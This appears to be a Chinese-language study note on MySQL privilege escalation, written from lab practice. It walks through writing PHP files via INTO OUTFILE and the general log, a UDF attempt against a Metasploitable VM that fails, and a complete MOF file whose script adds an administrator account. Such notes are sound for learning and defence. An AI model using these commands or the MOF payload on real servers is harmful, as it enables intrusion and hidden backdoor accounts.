# mysql提权常见手段

<br>

### 获取Webshell

<br>

**1.outfile函数写shell**

**条件**

1.连接上数据库或者遇到能任意执行sql语句

2.load_file () 开启 即 secure_file_priv 无限制

3.网站路径有写入权限

**步骤**

首先确认secure_file_priv是否有限制

```sql
show global variables like '%secure_file_priv%';
```

| Value | 说明                       |
| ----- | -------------------------- |
| NULL  | 不允许导入或导出           |
| /tmp  | 只允许在 /tmp 目录导入导出 |
| 空    | 不限制目录                 |

<br>

如果为空其他条件又是满足

执行

```sql
select '<?php phpinfo(); ?>' into outfile '/var/www/html/info.php';
```

访问拿到shell(一般情况下 Linux 系统下面权限分配比较严格，可能不让写网站目录)

<br>

**2.日志文件写 shell**

条件：

- Web 文件夹宽松权限可以写入
- 最好是Windows 系统下
- 高权限运行 MySQL 或者 Apache

MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell

<br>

```bash
# 更改日志文件位置
set global general_log = "ON";
set global general_log_file='/var/www/html/info.php';

# 查看当前配置
mysql> SHOW VARIABLES LIKE 'general%';
+------------------+-----------------------------+
| Variable_name    | Value                       |
+------------------+-----------------------------+
| general_log      | ON                          |
| general_log_file | /var/www/html/info.php |
+------------------+-----------------------------+

# 往日志里面写入 payload
select '<?php phpinfo();?>';

# 此时已经写到 info.php 文件当中了
root@c1595d3a029a:/var/www/html/$ cat info.php 
/usr/sbin/mysqld, Version: 5.5.61-0ubuntu0.14.04.1 ((Ubuntu)). started with:
Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
201031 21:14:46       40 Query    SHOW VARIABLES LIKE 'general%'
201031 21:15:34       40 Query    select '<?php phpinfo();?>
```



<br>

### UDF提权

UDF(user defined function)用户自定义函数，他是mysql的一个功能，它允许用户用C写代码，编译成动态链接库(windows下的dll和linux下的so文件)，伤处啊sql加载后，就可以在数据库里使用自己写的恶意函数了，进而提升权限

<br>

我这里通过metasploitable和kali进行复现

分别开启两个虚拟机，记得都设置成桥接模式，保证两者能ping通

##### 一.链接靶机mysql

```sql
mysql -h 192.168.5.31 -u root --ssl=0 //记得要关闭ssl
```

```sql
show global variables like '%secure_file_priv%';//查看是否可以任意写文件（空值代表可以）
```

![image-20260522230536093](C:\Users\22295\AppData\Roaming\Typora\typora-user-images\image-20260522230536093.png)

```sql
show variables like '%plugin_dir%'; //查看库目录

如果显示了empty set，这是因为mysql版本太老了，这个版本没有设计mysql专属的动态链接库目录(/usr/lib/mysql/plugin)，我们要把恶意so文件直接写入系统库目录(/usr/lib)
```

> mysql5.0及以下，没有配置plugin_dir。udf的so文件一般要写进系统库目录（如/usr/lib)
>
> mysql5.1及以上，运行show variables like '%plugin_dir%';可以看到指定的udf的so文件存放目录，必须写在该文件路径下才能解析到



<br>

##### 二.准备并写入恶意so文件

这个文件kali里自带有，当然也可以去网上下一个

```bash
cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so /tmp/udf.so   
//复制原本的那个文件
```

<br>

```bash
cd /tmp
xxd -p udf.so | tr -d '\n' > udf_hex.txt  
//转换成十六进制
```

<br>

```sql
SELECT 0x7F454C46...完整十六进制数据... INTO DUMPFILE '/usr/lib/udf.so';  

//写入文件，这里看into outfile应该也是可以的，但是它可能会在末尾加上换行，into dumpfile可能会更稳
```

结果发现根本写不进去。。。。。。。。

但是换成/tmp又可以写，他妈的。mysql用户是root，应该是linux权限不让写/usr/lib（毕竟mysql root权限不等于linux root）

![image-20260523001800083](C:\Users\22295\AppData\Roaming\Typora\typora-user-images\image-20260523001800083.png)

头铁试一下/tmp下目录能不能

```sql
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME '/tmp/udf.so';
```

报错：no paths allowed for sahred library

看起来不支持这个目录，没招了。搜了一下应该是mysql版本太老还不一定支持写udf文件，可以用raven2这个靶机，后面可能会在出一篇博客

<br>

<br>

### MOF提权

该提权方式存在于早期的windows环境，现在一般看不到了

<br>

**原理：**

`C:/Windows/system32/wbem/mof/` 目录下的 mof 文件每隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。

<br>

**复现流程**

其实和udf步骤类似。

先准备一个恶意mof文件

```
#pragma namespace("\\\\.\\root\\subscription") 

instance of __EventFilter as $EventFilter 
{ 
    EventNamespace = "Root\\Cimv2"; 
    Name  = "filtP2"; 
    Query = "Select * From __InstanceModificationEvent " 
            "Where TargetInstance Isa \"Win32_LocalTime\" " 
            "And TargetInstance.Second = 5"; 
    QueryLanguage = "WQL"; 
}; 

instance of ActiveScriptEventConsumer as $Consumer 
{ 
    Name = "consPCSV2"; 
    ScriptingEngine = "JScript"; 
    ScriptText = 
"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user hacker P@ssw0rd /add\")\nWSH.run(\"net.exe localgroup administrators hacker /add\")"; 
}; 

instance of __FilterToConsumerBinding 
{ 
    Consumer   = $Consumer; 
    Filter = $EventFilter; 
};
```

编码后利用mysql语句写入

```
select "编码后的语句" into dumpfile 'C:\\Windows\\System32\\wbem\\mof\\xxx.mof'
```

然后等待系统自动执行就可以了

<br>

<br>

还有其他一些提权，但是基本都和udf和mof思路一样：写入到系统某个文件夹，然后依据各自的特性和利用方法进行调用
